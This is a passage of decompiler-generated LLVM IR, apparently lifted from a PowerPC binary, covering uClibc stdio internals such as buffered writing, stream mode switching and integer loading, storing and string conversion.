entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_10007788 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_100077a4 = load i16, i16* %arg3, align 2
  %v1_100077a8 = and i16 %v3_100077a4, 512
  %v3_100077a8 = icmp eq i16 %v1_100077a8, 0
  br i1 %v3_100077a8, label %dec_label_pc_100077b0, label %dec_label_pc_100078bc

dec_label_pc_100077b0:                            ; preds = %entry
  %v2_100077b0 = add i32 %tmp, 4
  %v3_100077b0 = inttoptr i32 %v2_100077b0 to i32*
  %v4_100077b0 = load i32, i32* %v3_100077b0, align 4
  %v2_100077b4 = add i32 %tmp, 16
  %v3_100077b4 = inttoptr i32 %v2_100077b4 to i32*
  %v4_100077b4 = load i32, i32* %v3_100077b4, align 4
  store i32 %v4_100077b4, i32* @r3, align 4
  %v3_100077b8 = icmp eq i32 %v4_100077b0, -2
  %v2_100077bc = add i32 %tmp, 12
  %v3_100077bc = inttoptr i32 %v2_100077bc to i32*
  %v4_100077bc = load i32, i32* %v3_100077bc, align 4
  %v2_100077c4 = sub i32 %v4_100077bc, %v4_100077b4
  br i1 %v3_100077b8, label %dec_label_pc_100077c4, label %dec_label_pc_100077f4

dec_label_pc_100077c4:                            ; preds = %dec_label_pc_100077b0
  %v3_100077cc = icmp ult i32 %v2_100077c4, %arg2
  br i1 %v3_100077cc, label %dec_label_pc_100077d4, label %dec_label_pc_100077d8

dec_label_pc_100077d4:                            ; preds = %dec_label_pc_100077c4
  br label %dec_label_pc_100077d8

dec_label_pc_100077d8:                            ; preds = %dec_label_pc_100077c4, %dec_label_pc_100077d4
  %storemerge = phi i32 [ %v2_100077c4, %dec_label_pc_100077d4 ], [ %arg2, %dec_label_pc_100077c4 ]
  %v0_100077dc = phi i32 [ %v2_100077c4, %dec_label_pc_100077d4 ], [ %arg2, %dec_label_pc_100077c4 ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_100077dc, i32* @r5, align 4
  store i32 268466148, i32* @lr, align 4
  %v0_100077e0 = call i32 @memcpy()
  %v0_100077e4 = load i32, i32* @r30, align 4
  %v1_100077e4 = add i32 %v0_100077e4, 16
  %v2_100077e4 = inttoptr i32 %v1_100077e4 to i32*
  %v3_100077e4 = load i32, i32* %v2_100077e4, align 4
  %v1_100077e8 = load i32, i32* @r31, align 4
  %v2_100077e8 = add i32 %v1_100077e8, %v3_100077e4
  store i32 %v2_100077e8, i32* %v2_100077e4, align 4
  br label %dec_label_pc_100078dc

dec_label_pc_100077f4:                            ; preds = %dec_label_pc_100077b0
  %v3_100077f8 = icmp ult i32 %v2_100077c4, %arg2
  br i1 %v3_100077f8, label %dec_label_pc_10007898, label %dec_label_pc_10007800

dec_label_pc_10007800:                            ; preds = %dec_label_pc_100077f4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268466188, i32* @lr, align 4
  %v0_10007808 = call i32 @memcpy()
  %v0_1000780c = load i32, i32* @r30, align 4
  %v1_1000780c = inttoptr i32 %v0_1000780c to i16*
  %v2_1000780c = load i16, i16* %v1_1000780c, align 2
  %v1_10007810 = add i32 %v0_1000780c, 16
  %v2_10007810 = inttoptr i32 %v1_10007810 to i32*
  %v3_10007810 = load i32, i32* %v2_10007810, align 4
  %v1_10007814 = and i16 %v2_1000780c, 256
  %v3_10007814 = icmp eq i16 %v1_10007814, 0
  %v1_10007818 = load i32, i32* @r29, align 4
  %v2_10007818 = add i32 %v1_10007818, %v3_10007810
  store i32 %v2_10007818, i32* %v2_10007810, align 4
  br i1 %v3_10007814, label %dec_label_pc_100078dc, label %dec_label_pc_10007824

dec_label_pc_10007824:                            ; preds = %dec_label_pc_10007800
  %v0_10007824 = load i32, i32* @r28, align 4
  %v0_1000782c = load i32, i32* @r29, align 4
  store i32 268466228, i32* @lr, align 4
  %v4_10007830 = call i32 @memrchr(i32 %v0_10007824, i32 10, i32 %v0_1000782c, i32 %v2_10007818)
  %v3_10007834 = icmp eq i32 %v4_10007830, 0
  br i1 %v3_10007834, label %dec_label_pc_100078dc, label %dec_label_pc_1000783c

dec_label_pc_1000783c:                            ; preds = %dec_label_pc_10007824
  %v0_1000783c = load i32, i32* @r30, align 4
  store i32 %v0_1000783c, i32* @r3, align 4
  store i32 268466244, i32* @lr, align 4
  %v0_10007840 = call i32 @__stdio_wcommit()
  %v3_10007844 = icmp eq i32 %v0_10007840, 0
  br i1 %v3_10007844, label %dec_label_pc_100078dc, label %dec_label_pc_1000784c

dec_label_pc_1000784c:                            ; preds = %dec_label_pc_1000783c
  %v0_1000784c = load i32, i32* @r29, align 4
  %v3_1000784c = icmp ugt i32 %v0_1000784c, %v0_10007840
  %v0_10007840.v0_10007850 = select i1 %v3_1000784c, i32 %v0_10007840, i32 %v0_1000784c
  store i32 %v0_10007840.v0_10007850, i32* @r31, align 4
  %v2_1000785c = sub i32 %v0_1000784c, %v0_10007840.v0_10007850
  %v0_10007864 = load i32, i32* @r28, align 4
  %v2_10007864 = add i32 %v0_10007864, %v2_1000785c
  store i32 %v2_10007864, i32* @r28, align 4
  store i32 %v2_10007864, i32* @r3, align 4
  store i32 268466292, i32* @lr, align 4
  %v3_10007870 = call i32 @__GI_memchr(i32 %v2_10007864, i32 10, i32 %v0_10007840.v0_10007850)
  %v3_10007874 = icmp eq i32 %v3_10007870, 0
  br i1 %v3_10007874, label %dec_label_pc_100078dc, label %dec_label_pc_1000787c

dec_label_pc_1000787c:                            ; preds = %dec_label_pc_1000784c
  %v0_1000787c = load i32, i32* @r30, align 4
  %v1_1000787c = add i32 %v0_1000787c, 16
  %v2_1000787c = inttoptr i32 %v1_1000787c to i32*
  %v3_1000787c = load i32, i32* %v2_1000787c, align 4
  %v0_10007880 = load i32, i32* @r28, align 4
  %v1_10007880 = load i32, i32* @r31, align 4
  %v2_10007880 = sub i32 %v0_10007880, %v3_10007870
  %v2_10007884 = add i32 %v2_10007880, %v1_10007880
  %v2_10007888 = sub i32 %v3_1000787c, %v2_10007884
  %v1_1000788c = load i32, i32* @r29, align 4
  %v2_1000788c = sub i32 %v1_1000788c, %v2_10007884
  store i32 %v2_1000788c, i32* @r29, align 4
  store i32 %v2_10007888, i32* %v2_1000787c, align 4
  br label %dec_label_pc_100078dc

dec_label_pc_10007898:                            ; preds = %dec_label_pc_100077f4
  %v2_10007898 = add i32 %tmp, 8
  %v3_10007898 = inttoptr i32 %v2_10007898 to i32*
  %v4_10007898 = load i32, i32* %v3_10007898, align 4
  %v4_1000789c = icmp eq i32 %v4_100077b4, %v4_10007898
  br i1 %v4_1000789c, label %dec_label_pc_100078bc, label %dec_label_pc_100078a4

dec_label_pc_100078a4:                            ; preds = %dec_label_pc_10007898
  store i32 %tmp, i32* @r3, align 4
  store i32 268466348, i32* @lr, align 4
  %v0_100078a8 = call i32 @__stdio_wcommit()
  %v3_100078ac = icmp eq i32 %v0_100078a8, 0
  br i1 %v3_100078ac, label %dec_label_pc_100078a4.dec_label_pc_100078bc_crit_edge, label %dec_label_pc_100078b4

dec_label_pc_100078a4.dec_label_pc_100078bc_crit_edge: ; preds = %dec_label_pc_100078a4
  %v0_100078c0.pre = load i32, i32* @r30, align 4
  %v0_100078c4.pre = load i32, i32* @r28, align 4
  %v0_100078c8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100078bc

dec_label_pc_100078b4:                            ; preds = %dec_label_pc_100078a4
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_100078dc

dec_label_pc_100078bc:                            ; preds = %dec_label_pc_100078a4.dec_label_pc_100078bc_crit_edge, %entry, %dec_label_pc_10007898
  %v0_100078c8 = phi i32 [ %v0_100078c8.pre, %dec_label_pc_100078a4.dec_label_pc_100078bc_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_10007898 ]
  %v0_100078c4 = phi i32 [ %v0_100078c4.pre, %dec_label_pc_100078a4.dec_label_pc_100078bc_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_10007898 ]
  %v0_100078c0 = phi i32 [ %v0_100078c0.pre, %dec_label_pc_100078a4.dec_label_pc_100078bc_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_10007898 ]
  %v1_100078c0 = inttoptr i32 %v0_100078c0 to i16*
  store i32 %v0_100078c8, i32* @r5, align 4
  store i32 %v0_10007788, i32* @lr, align 4
  %v5_100078d8 = call i32 @__stdio_WRITE(i16* %v1_100078c0, i32 %v0_100078c4)
  br label %dec_label_pc_100078dc

dec_label_pc_100078dc:                            ; preds = %dec_label_pc_1000784c, %dec_label_pc_1000783c, %dec_label_pc_10007824, %dec_label_pc_10007800, %dec_label_pc_100078b4, %dec_label_pc_1000787c, %dec_label_pc_100077d8, %dec_label_pc_100078bc
  %v0_100078e0 = load i32, i32* @r29, align 4
  ret i32 %v0_100078e0

; uselistorder directives
  uselistorder i32 %v2_10007884, { 1, 0 }
  uselistorder i32 %v0_10007840.v0_10007850, { 0, 2, 1 }
  uselistorder i32 %v0_1000784c, { 1, 0, 2 }
  uselistorder i32 %v2_100077c4, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_100078dc, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_100078bc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100077d8, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_100078f4 = load i32, i32* @lr, align 4
  store i32 %v0_100078f4, i32* %r0.global-to-local, align 4
  %v0_100078fc = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10007908 = load i16, i16* %arg1, align 2
  %v4_10007908 = zext i16 %v3_10007908 to i32
  store i32 %v4_10007908, i32* %r0.global-to-local, align 4
  %v1_1000790c = load i32, i32* @r4, align 4
  %v2_1000790c = and i32 %v1_1000790c, %v4_10007908
  store i32 %v2_1000790c, i32* %r9.global-to-local, align 4
  %v5_1000790c = icmp eq i32 %v2_1000790c, 0
  br i1 %v5_1000790c, label %dec_label_pc_10007914, label %dec_label_pc_10007924

dec_label_pc_10007914:                            ; preds = %entry
  %v1_10007914 = and i32 %v4_10007908, 2176
  store i32 %v1_10007914, i32* %r9.global-to-local, align 4
  %v3_10007914 = icmp eq i32 %v1_10007914, 0
  br i1 %v3_10007914, label %dec_label_pc_1000791c, label %dec_label_pc_10007930

dec_label_pc_1000791c:                            ; preds = %dec_label_pc_10007914
  %v2_1000791c = or i32 %v1_1000790c, %v4_10007908
  store i32 %v2_1000791c, i32* %r0.global-to-local, align 4
  %v1_10007920 = trunc i32 %v2_1000791c to i16
  store i16 %v1_10007920, i16* %arg1, align 2
  %v0_10007924.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007924

dec_label_pc_10007924:                            ; preds = %entry, %dec_label_pc_1000791c
  %v0_10007960 = phi i32 [ %tmp, %entry ], [ %v0_10007924.pre, %dec_label_pc_1000791c ]
  %v1_10007924 = inttoptr i32 %v0_10007960 to i16*
  %v2_10007924 = load i16, i16* %v1_10007924, align 2
  %v3_10007924 = zext i16 %v2_10007924 to i32
  %v1_10007928 = and i32 %v3_10007924, 32
  store i32 %v1_10007928, i32* %r0.global-to-local, align 4
  %v3_10007928 = icmp eq i32 %v1_10007928, 0
  br i1 %v3_10007928, label %dec_label_pc_10007950, label %dec_label_pc_10007930

dec_label_pc_10007930:                            ; preds = %dec_label_pc_10007914, %dec_label_pc_10007924
  %v0_10007930 = call i32 @__errno_location()
  store i32 %v0_10007930, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_10007938 = inttoptr i32 %v0_10007930 to i32*
  store i32 9, i32* %v2_10007938, align 4
  br label %dec_label_pc_1000793c

dec_label_pc_1000793c:                            ; preds = %dec_label_pc_10007978, %dec_label_pc_10007930
  %v0_1000793c = load i32, i32* @r31, align 4
  %v1_1000793c = inttoptr i32 %v0_1000793c to i16*
  %v2_1000793c = load i16, i16* %v1_1000793c, align 2
  %v3_1000793c = zext i16 %v2_1000793c to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10007944 = or i32 %v3_1000793c, 8
  store i32 %v1_10007944, i32* %r0.global-to-local, align 4
  %v1_10007948 = trunc i32 %v1_10007944 to i16
  store i16 %v1_10007948, i16* %v1_1000793c, align 2
  br label %dec_label_pc_100079d8

dec_label_pc_10007950:                            ; preds = %dec_label_pc_10007924
  %tmp8 = urem i16 %v2_10007924, 4
  %v1_10007950 = zext i16 %tmp8 to i32
  store i32 %v1_10007950, i32* %r0.global-to-local, align 4
  %v3_10007950 = icmp eq i16 %tmp8, 0
  br i1 %v3_10007950, label %dec_label_pc_100079b4, label %dec_label_pc_10007958

dec_label_pc_10007958:                            ; preds = %dec_label_pc_10007950
  %v1_10007958 = and i32 %v3_10007924, 4
  store i32 %v1_10007958, i32* %r9.global-to-local, align 4
  %v3_10007958 = icmp eq i32 %v1_10007958, 0
  br i1 %v3_10007958, label %dec_label_pc_10007960, label %dec_label_pc_10007998

dec_label_pc_10007960:                            ; preds = %dec_label_pc_10007958
  %v1_10007960 = add i32 %v0_10007960, 20
  %v2_10007960 = inttoptr i32 %v1_10007960 to i32*
  %v3_10007960 = load i32, i32* %v2_10007960, align 4
  store i32 %v3_10007960, i32* %r0.global-to-local, align 4
  %v1_10007964 = add i32 %v0_10007960, 16
  %v2_10007964 = inttoptr i32 %v1_10007964 to i32*
  %v3_10007964 = load i32, i32* %v2_10007964, align 4
  store i32 %v3_10007964, i32* %r9.global-to-local, align 4
  %v4_10007968 = icmp eq i32 %v3_10007960, %v3_10007964
  br i1 %v4_10007968, label %dec_label_pc_10007970, label %dec_label_pc_10007978

dec_label_pc_10007970:                            ; preds = %dec_label_pc_10007960
  %v1_10007970 = and i32 %v3_10007924, 2
  store i32 %v1_10007970, i32* %r0.global-to-local, align 4
  %v3_10007970 = icmp eq i32 %v1_10007970, 0
  br i1 %v3_10007970, label %dec_label_pc_10007998, label %dec_label_pc_10007978

dec_label_pc_10007978:                            ; preds = %dec_label_pc_10007960, %dec_label_pc_10007970
  %v1_10007978 = and i32 %v3_10007924, 1024
  store i32 %v1_10007978, i32* %r9.global-to-local, align 4
  %v0_10007980 = call i32 @__asm_mfcr()
  store i32 %v0_10007980, i32* %r3.global-to-local, align 4
  %v1_10007984 = call i32 @__asm_rlwinm(i32 %v0_10007980, i32 3, i32 31, i32 31)
  %v1_10007988 = sub i32 2, %v1_10007984
  store i32 %v1_10007988, i32* @r5, align 4
  store i32 268466576, i32* @lr, align 4
  %v1_1000798c = call i32 @__GI_fseek(i32 %v1_10007988)
  store i32 %v1_1000798c, i32* %r3.global-to-local, align 4
  %v3_10007990 = icmp eq i32 %v1_1000798c, 0
  br i1 %v3_10007990, label %dec_label_pc_10007978.dec_label_pc_10007998_crit_edge, label %dec_label_pc_1000793c

dec_label_pc_10007978.dec_label_pc_10007998_crit_edge: ; preds = %dec_label_pc_10007978
  %v0_10007998.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007998

dec_label_pc_10007998:                            ; preds = %dec_label_pc_10007978.dec_label_pc_10007998_crit_edge, %dec_label_pc_10007958, %dec_label_pc_10007970
  %v0_10007998 = phi i32 [ %v0_10007998.pre, %dec_label_pc_10007978.dec_label_pc_10007998_crit_edge ], [ %v0_10007960, %dec_label_pc_10007958 ], [ %v0_10007960, %dec_label_pc_10007970 ]
  %v1_10007998 = inttoptr i32 %v0_10007998 to i16*
  %v2_10007998 = load i16, i16* %v1_10007998, align 2
  %v3_10007998 = zext i16 %v2_10007998 to i32
  store i32 %v3_10007998, i32* %r0.global-to-local, align 4
  %v1_1000799c = add i32 %v0_10007998, 8
  %v2_1000799c = inttoptr i32 %v1_1000799c to i32*
  %v3_1000799c = load i32, i32* %v2_1000799c, align 4
  store i32 %v3_1000799c, i32* %r9.global-to-local, align 4
  %v1_100079a0 = call i32 @__asm_rlwinm(i32 %v3_10007998, i32 0, i32 0, i32 29)
  %v2_100079a0 = trunc i32 %v1_100079a0 to i16
  store i32 %v1_100079a0, i32* %r0.global-to-local, align 4
  %v3_100079a4 = load i32, i32* @r31, align 4
  %v4_100079a4 = inttoptr i32 %v3_100079a4 to i16*
  store i16 %v2_100079a0, i16* %v4_100079a4, align 2
  %v0_100079a8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100079a8 = load i32, i32* @r31, align 4
  %v2_100079a8 = add i32 %v1_100079a8, 20
  %v3_100079a8 = inttoptr i32 %v2_100079a8 to i32*
  store i32 %v0_100079a8, i32* %v3_100079a8, align 4
  %v0_100079ac = load i32, i32* %r9.global-to-local, align 4
  %v1_100079ac = load i32, i32* @r31, align 4
  %v2_100079ac = add i32 %v1_100079ac, 24
  %v3_100079ac = inttoptr i32 %v2_100079ac to i32*
  store i32 %v0_100079ac, i32* %v3_100079ac, align 4
  %v0_100079b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100079b0 = load i32, i32* @r31, align 4
  %v2_100079b0 = add i32 %v1_100079b0, 16
  %v3_100079b0 = inttoptr i32 %v2_100079b0 to i32*
  store i32 %v0_100079b0, i32* %v3_100079b0, align 4
  %v0_100079b4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100079b4

dec_label_pc_100079b4:                            ; preds = %dec_label_pc_10007950, %dec_label_pc_10007998
  %v2_100079c0 = phi i32 [ %v0_10007960, %dec_label_pc_10007950 ], [ %v0_100079b4.pre, %dec_label_pc_10007998 ]
  %v1_100079b4 = inttoptr i32 %v2_100079c0 to i16*
  %v2_100079b4 = load i16, i16* %v1_100079b4, align 2
  %v3_100079b4 = zext i16 %v2_100079b4 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100079bc = or i32 %v3_100079b4, 64
  store i32 %v1_100079bc, i32* %r0.global-to-local, align 4
  %v1_100079c0 = trunc i32 %v1_100079bc to i16
  store i16 %v1_100079c0, i16* %v1_100079b4, align 2
  %v0_100079c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100079c4 = urem i32 %v0_100079c4, 65536
  store i32 %v1_100079c4, i32* %r0.global-to-local, align 4
  %v1_100079c8 = and i32 %v0_100079c4, 2816
  store i32 %v1_100079c8, i32* %r9.global-to-local, align 4
  %v3_100079c8 = icmp eq i32 %v1_100079c8, 0
  br i1 %v3_100079c8, label %dec_label_pc_100079d0, label %dec_label_pc_100079d8

dec_label_pc_100079d0:                            ; preds = %dec_label_pc_100079b4
  %v0_100079d0 = load i32, i32* @r31, align 4
  %v1_100079d0 = add i32 %v0_100079d0, 12
  %v2_100079d0 = inttoptr i32 %v1_100079d0 to i32*
  %v3_100079d0 = load i32, i32* %v2_100079d0, align 4
  store i32 %v3_100079d0, i32* %r0.global-to-local, align 4
  %v2_100079d4 = add i32 %v0_100079d0, 28
  %v3_100079d4 = inttoptr i32 %v2_100079d4 to i32*
  store i32 %v3_100079d0, i32* %v3_100079d4, align 4
  br label %dec_label_pc_100079d8

dec_label_pc_100079d8:                            ; preds = %dec_label_pc_100079b4, %dec_label_pc_1000793c, %dec_label_pc_100079d0
  store i32 %v0_100078f4, i32* %r0.global-to-local, align 4
  store i32 %v0_100078fc, i32* @r31, align 4
  %v0_100079e8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100079e8

; uselistorder directives
  uselistorder i32 %v0_100079c4, { 1, 0 }
  uselistorder i32 %v1_100079a0, { 1, 0 }
  uselistorder i32 %v0_10007998, { 1, 0 }
  uselistorder i32 %v0_10007960, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_10007908, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 2, 3, 0, 5, 6, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder i32 1024, { 7, 8, 9, 6, 0, 1, 2, 4, 5, 3 }
  uselistorder label %dec_label_pc_100079d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100079b4, { 1, 0 }
  uselistorder label %dec_label_pc_10007998, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10007978, { 1, 0 }
  uselistorder label %dec_label_pc_10007930, { 1, 0 }
  uselistorder label %dec_label_pc_10007924, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_100079ec = load i32, i32* @r5, align 4
  %v1_100079ec = icmp slt i32 %v0_100079ec, 0
  %v1_100079f0 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_10007a2c = icmp eq i32 %v1_100079f0, 0
  br i1 %v1_100079ec, label %dec_label_pc_10007a2c, label %dec_label_pc_100079f8

dec_label_pc_100079f8:                            ; preds = %entry
  br i1 %v3_10007a2c, label %dec_label_pc_10007a00, label %dec_label_pc_10007a34

dec_label_pc_10007a00:                            ; preds = %dec_label_pc_100079f8
  %v3_10007a00 = icmp eq i32 %arg1, 256
  br i1 %v3_10007a00, label %dec_label_pc_10007a0c, label %dec_label_pc_10007a14

dec_label_pc_10007a0c:                            ; preds = %dec_label_pc_10007a00
  br label %dec_label_pc_10007a20

dec_label_pc_10007a14:                            ; preds = %dec_label_pc_10007a00
  %v3_10007a14 = icmp eq i32 %arg1, 512
  br i1 %v3_10007a14, label %dec_label_pc_10007a1c, label %dec_label_pc_10007a20

dec_label_pc_10007a1c:                            ; preds = %dec_label_pc_10007a14
  br label %dec_label_pc_10007a20

dec_label_pc_10007a20:                            ; preds = %dec_label_pc_10007a14, %dec_label_pc_10007a0c, %dec_label_pc_10007a1c
  ret i32 0

dec_label_pc_10007a2c:                            ; preds = %entry
  br i1 %v3_10007a2c, label %dec_label_pc_10007a40, label %dec_label_pc_10007a34

dec_label_pc_10007a34:                            ; preds = %dec_label_pc_100079f8, %dec_label_pc_10007a2c
  %v2_10007a34 = load i32, i32* %arg2, align 4
  ret i32 %v2_10007a34

dec_label_pc_10007a40:                            ; preds = %dec_label_pc_10007a2c
  %v3_10007a40 = icmp eq i32 %arg1, 256
  %v2_10007a44 = load i32, i32* %arg2, align 4
  br i1 %v3_10007a40, label %dec_label_pc_10007a4c, label %dec_label_pc_10007a54

dec_label_pc_10007a4c:                            ; preds = %dec_label_pc_10007a40
  %v1_10007a4c = urem i32 %v2_10007a44, 256
  br label %dec_label_pc_10007a60

dec_label_pc_10007a54:                            ; preds = %dec_label_pc_10007a40
  %v3_10007a54 = icmp eq i32 %arg1, 512
  br i1 %v3_10007a54, label %dec_label_pc_10007a5c, label %dec_label_pc_10007a60

dec_label_pc_10007a5c:                            ; preds = %dec_label_pc_10007a54
  %v1_10007a5c = mul i32 %v2_10007a44, 65536
  %v2_10007a5c = sdiv i32 %v1_10007a5c, 65536
  br label %dec_label_pc_10007a60

dec_label_pc_10007a60:                            ; preds = %dec_label_pc_10007a54, %dec_label_pc_10007a4c, %dec_label_pc_10007a5c
  %v0_10007a60 = phi i32 [ %v2_10007a44, %dec_label_pc_10007a54 ], [ %v1_10007a4c, %dec_label_pc_10007a4c ], [ %v2_10007a5c, %dec_label_pc_10007a5c ]
  %tmp = icmp slt i32 %v0_10007a60, 0
  %v1_10007a64 = zext i1 %tmp to i32
  %v2_10007a64 = ashr i32 %v0_10007a60, 31
  %v3_10007a64 = and i32 %v2_10007a64, -2
  %v4_10007a64 = or i32 %v3_10007a64, %v1_10007a64
  ret i32 %v4_10007a64

; uselistorder directives
  uselistorder i32 %v0_10007a60, { 1, 0 }
  uselistorder i32 %v2_10007a44, { 2, 0, 1 }
  uselistorder i1 %v3_10007a2c, { 1, 0 }
  uselistorder i32 %arg1, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_10007a60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007a34, { 1, 0 }
  uselistorder label %dec_label_pc_10007a20, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10007a6c = load i32, i32* @r4, align 4
  %v3_10007a6c = icmp eq i32 %v0_10007a6c, 256
  br i1 %v3_10007a6c, label %dec_label_pc_10007a78, label %dec_label_pc_10007a80

dec_label_pc_10007a78:                            ; preds = %entry
  %v0_10007a78 = load i32, i32* @r6, align 4
  %v1_10007a78 = trunc i32 %v0_10007a78 to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_10007a78, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_10007a80:                            ; preds = %entry
  %v3_10007a70 = icmp eq i32 %v0_10007a6c, 2048
  br i1 %v3_10007a70, label %dec_label_pc_10007a88, label %dec_label_pc_10007a94

dec_label_pc_10007a88:                            ; preds = %dec_label_pc_10007a80
  %v0_10007a88 = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_10007a88, i32* %tmp2, align 4
  %v0_10007a8c = load i32, i32* @r6, align 4
  %v3_10007a8c = add i32 %tmp, 4
  %v4_10007a8c = inttoptr i32 %v3_10007a8c to i32*
  store i32 %v0_10007a8c, i32* %v4_10007a8c, align 4
  ret i32 %tmp

dec_label_pc_10007a94:                            ; preds = %dec_label_pc_10007a80
  %v3_10007a80 = icmp eq i32 %v0_10007a6c, 512
  %v0_10007a98 = load i32, i32* @r6, align 4
  br i1 %v3_10007a80, label %dec_label_pc_10007a98, label %dec_label_pc_10007aa0

dec_label_pc_10007a98:                            ; preds = %dec_label_pc_10007a94
  %v1_10007a98 = trunc i32 %v0_10007a98 to i16
  store i16 %v1_10007a98, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_10007aa0:                            ; preds = %dec_label_pc_10007a94
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_10007a98, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 0, 3, 2, 1, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10007aa8 = load i32, i32* @r7, align 4
  %v3_10007aa8 = icmp eq i32 %v0_10007aa8, 0
  store i1 %v3_10007aa8, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* %r30.global-to-local, align 4
  %tmp12 = icmp sgt i32 %v0_10007aa8, -1
  br i1 %tmp12, label %dec_label_pc_10007adc, label %dec_label_pc_10007abc

dec_label_pc_10007abc:                            ; preds = %entry
  %v0_10007abc = load i32, i32* %r5.global-to-local, align 4
  %v1_10007ac0 = sub i32 0, %v0_10007aa8
  store i32 %v1_10007ac0, i32* @r7, align 4
  %tmp13 = icmp sgt i32 %v0_10007abc, -1
  br i1 %tmp13, label %dec_label_pc_10007adc, label %dec_label_pc_10007ac8

dec_label_pc_10007ac8:                            ; preds = %dec_label_pc_10007abc
  %v0_10007ac8 = load i32, i32* %r6.global-to-local, align 4
  %v1_10007ac8 = sub i32 0, %v0_10007ac8
  %v2_10007ac8 = sub i32 -1, %v0_10007ac8
  store i32 %v1_10007ac8, i32* %r6.global-to-local, align 4
  %v4_10007ac8 = icmp uge i32 %v2_10007ac8, %v1_10007ac8
  %v1_10007acc = sub i32 -1, %v0_10007abc
  %v3_10007acc = zext i1 %v4_10007ac8 to i32
  %v4_10007acc = add i32 %v3_10007acc, %v1_10007acc
  store i32 %v4_10007acc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10007adc

dec_label_pc_10007adc:                            ; preds = %entry, %dec_label_pc_10007abc, %dec_label_pc_10007ac8
  %v1_10007ae0 = phi i32 [ %v1_10007ac0, %dec_label_pc_10007ac8 ], [ %v1_10007ac0, %dec_label_pc_10007abc ], [ %v0_10007aa8, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10007ac8 ], [ 0, %dec_label_pc_10007abc ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_10007ae0 = udiv i32 -1, %v1_10007ae0
  store i32 %v2_10007ae0, i32* %r8.global-to-local, align 4
  %v2_10007ae8 = load i32, i32* %r3.global-to-local, align 4
  %v3_10007ae8 = inttoptr i32 %v2_10007ae8 to i8*
  store i8 0, i8* %v3_10007ae8, align 1
  %v0_10007aec = load i32, i32* %r8.global-to-local, align 4
  %v1_10007aec = load i32, i32* @r7, align 4
  %v2_10007aec = mul i32 %v1_10007aec, %v0_10007aec
  %v1_10007af0 = sub i32 0, %v2_10007aec
